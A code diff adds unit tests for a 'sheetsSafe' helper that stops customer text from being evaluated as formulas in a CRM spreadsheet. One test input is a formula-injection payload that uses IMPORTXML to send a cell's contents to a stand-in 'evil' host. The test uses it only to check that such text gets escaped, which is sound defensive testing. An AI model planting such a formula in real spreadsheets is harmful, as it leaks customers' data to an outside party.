@@ -7,6 +7,7 @@ import {
   clampDiscountPercent,
   escapeLike,
   genDiscountCode,
+  sheetsSafe,
 } from "../../supabase/functions/_shared/discountCode";
 
 // Covers the discount-code generator extracted from the on-session-created Edge
@@ -71,6 +72,24 @@ describe("genDiscountCode with untrusted percentages", () => {
   });
 });
 
+describe("sheetsSafe — the CRM sheet must not evaluate customer text", () => {
+  it("keeps formula-looking text as text with a leading apostrophe", () => {
+    for (const evil of ['=IMPORTXML("http://evil/?"&A2,"//a")', "+1+1", "-2+3", "@SUM(A1)"]) {
+      expect(sheetsSafe(evil)).toBe(`'${evil}`);
+    }
+  });
+  it("leaves ordinary values alone and flattens line breaks", () => {
+    expect(sheetsSafe("Marco")).toBe("Marco");
+    expect(sheetsSafe("marco.rossi@example.com")).toBe("marco.rossi@example.com");
+    expect(sheetsSafe("a\r\nb")).toBe("a b");
+    expect(sheetsSafe(null)).toBe("");
+    expect(sheetsSafe(undefined)).toBe("");
+  });
+  it("caps the length", () => {
+    expect(sheetsSafe("x".repeat(900))).toHaveLength(500);
+  });
+});
+
 describe("escapeLike", () => {
   it("escapes the LIKE wildcards so an address is matched literally", () => {
     expect(escapeLike("a_b%c\\d@x.com")).toBe("a\\_b\\%c\\\\d@x.com");
@@ -88,7 +107,7 @@ describe("on-session-created keeps its inline copies in lockstep with _shared/di
     expect(m, `${name} not found`).not.toBeNull();
     return m![0].replace(/^export /, "").replace(/\s+/g, " ");
   };
-  for (const fn of ["genDiscountCode", "clampDiscountPercent", "escapeLike"]) {
+  for (const fn of ["genDiscountCode", "clampDiscountPercent", "escapeLike", "sheetsSafe"]) {
     it(`${fn} is identical`, () => {
       expect(body(edge, fn)).toBe(body(shared, fn));
     });
